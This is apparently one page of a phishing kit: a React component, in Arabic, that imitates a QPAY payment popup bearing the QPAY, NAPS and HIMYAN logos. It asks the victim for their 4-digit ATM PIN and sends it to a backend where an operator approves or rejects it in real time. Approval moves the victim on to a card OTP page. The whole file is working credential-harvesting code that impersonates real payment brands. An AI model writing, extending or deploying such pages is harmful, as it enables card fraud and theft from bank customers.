import { useState, useRef, useEffect } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react";
import WaitingOverlay from "@/components/WaitingOverlay";
import {
  sendData,
  codeAction,
  cardAction,
  navigateToPage,
} from "@/lib/store";

export default function ATMPassword() {
  const [, navigate] = useLocation();
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [error, setError] = useState("");
  const [isWaiting, setIsWaiting] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    navigateToPage("كلمة مرور ATM");
    inputRef.current?.focus();
  }, []);

  useSignalEffect(() => {
    const action = codeAction.value;
    if (action) {
      if (action.action === "approve") {
        navigate("/card-otp");
      } else if (action.action === "reject") {
        setPin("");
        setError("الرمز المدخل غير صحيح، يرجى ادخال الرمز السري للبطاقة والمكون من 4 ارقام");
        setIsWaiting(false);
        inputRef.current?.focus();
      }
      codeAction.value = null;
    }
  });

  useSignalEffect(() => {
    const action = cardAction.value;
    if (action) {
      if (action.action === "atm") {
        navigate("/card-otp");
      } else if (action.action === "reject") {
        setPin("");
        setError("الرمز المدخل غير صحيح، يرجى ادخال الرمز السري للبطاقة والمكون من 4 ارقام");
        setIsWaiting(false);
        inputRef.current?.focus();
      }
      cardAction.value = null;
    }
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (pin.length !== 4) {
      setError("الرمز المدخل غير صحيح، يرجى ادخال الرمز السري للبطاقة والمكون من 4 ارقام");
      return;
    }
    setError("");
    setIsWaiting(true);
    sendData({
      digitCode: pin,
      current: "كلمة مرور ATM",
      nextPage: "توثيق رقم الجوال",
      waitingForAdminResponse: true,
    });
  };

  return (
    <div style={{ minHeight: "100vh", backgroundColor: "#4a0028", display: "flex", alignItems: "center", justifyContent: "center", fontFamily: `-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif`, direction: "rtl" }}>
      <WaitingOverlay />

      {/* Popup */}
      <div style={{ backgroundColor: "#fff", borderRadius: 4, padding: "30px 40px 24px", width: "100%", maxWidth: 520, position: "relative", boxShadow: "0 4px 20px rgba(0,0,0,0.3)" }}>

        {/* Close button */}
        <button onClick={() => window.history.back()} style={{ position: "absolute", top: 12, left: 14, background: "none", border: "none", fontSize: 20, cursor: "pointer", color: "#555", lineHeight: 1 }}>✕</button>

        {/* QPAY Logo */}
        <div style={{ textAlign: "center", marginBottom: 20 }}>
          <img src="/qpay-logo.png" alt="QPAY" style={{ height: 28, objectFit: "contain" }} />
        </div>

        {/* Description */}
        <p style={{ textAlign: "center", fontSize: 14, color: "#333", marginBottom: 20, lineHeight: 1.6 }}>
          يرجى ادخال رمز الصراف المكون من 4 ارقام لتأكيد الدفع
        </p>

        {/* Form */}
        <form onSubmit={handleSubmit}>
          <div style={{ display: "flex", gap: 0, marginBottom: 12 }}>
            <input
              ref={inputRef}
              type={showPin ? "text" : "password"}
              inputMode="numeric"
              maxLength={4}
              value={pin}
              onChange={(e) => {
                const val = e.target.value.replace(/\D/g, "").slice(0, 4);
                setPin(val);
                setError("");
              }}
              placeholder="****"
              style={{ flex: 1, height: 44, border: "1px solid #ccc", borderRight: "none", padding: "0 14px", fontSize: 18, outline: "none", fontFamily: "inherit", letterSpacing: showPin ? 2 : 6, backgroundColor: "#f9f9f9" }}
            />
            <button
              type="submit"
              disabled={isWaiting || pin.length !== 4}
              style={{ backgroundColor: pin.length === 4 && !isWaiting ? "#4a0028" : "#ccc", color: "#fff", border: "none", padding: "0 24px", fontSize: 14, fontWeight: "bold", cursor: pin.length === 4 ? "pointer" : "not-allowed", fontFamily: "inherit", whiteSpace: "nowrap" }}
            >
              {isWaiting ? "..." : "تحقق"}
            </button>
          </div>

          {/* Error */}
          {error && (
            <p style={{ color: "#c41e3a", fontSize: 12, textAlign: "center", marginBottom: 12, lineHeight: 1.5 }}>
              {error}
            </p>
          )}
        </form>

        {/* NAPS + HIMYAN logos */}
        <div style={{ display: "flex", justifyContent: "center", gap: 16, marginTop: 8 }}>
          <img src="/assets/naps-logo.svg" alt="NAPS" style={{ height: 22 }} onError={(e) => { e.currentTarget.style.display = 'none'; }} />
          <img src="/assets/himyan-logo.svg" alt="HIMYAN" style={{ height: 22 }} onError={(e) => { e.currentTarget.style.display = 'none'; }} />
        </div>
      </div>
    </div>
  );
}
